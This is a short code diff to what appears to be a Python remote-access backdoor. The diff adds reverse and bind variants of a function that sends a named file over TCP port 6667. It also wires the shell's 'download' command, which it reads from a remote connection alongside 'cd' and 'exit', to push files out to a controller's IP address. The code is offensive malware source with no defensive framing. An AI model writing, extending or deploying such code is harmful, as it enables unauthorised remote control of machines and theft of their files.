@@ -48,9 +48,14 @@ def easy_chdir(s):
     except:
         pass
     
-def easy_file_send(filename, IP):
+def file_send_reverse(filename, IP):
     xf = tcp_socket()
     xf.connect_to(IP, 6667)
+    xf.send_file(filename)
+    
+def file_send_bind(filename, IP):
+    xf = tcp_socket()
+    xf.listen_on(6667)
     xf.send_file(filename)
 
 # python2.7 and python3
@@ -75,7 +80,7 @@ def easy_cmd(conn):
         if cmd.startswith('cd'):
             easy_chdir(cmd[3:len(cmd) - 1])
         elif cmd.startswith('download'):
-            easy_file_send(cmd[9:len(cmd)-1], IP)
+            file_send_reverse(cmd[9:len(cmd)-1], IP)
         elif cmd == "exit\n":
             conn.close()
             exit()
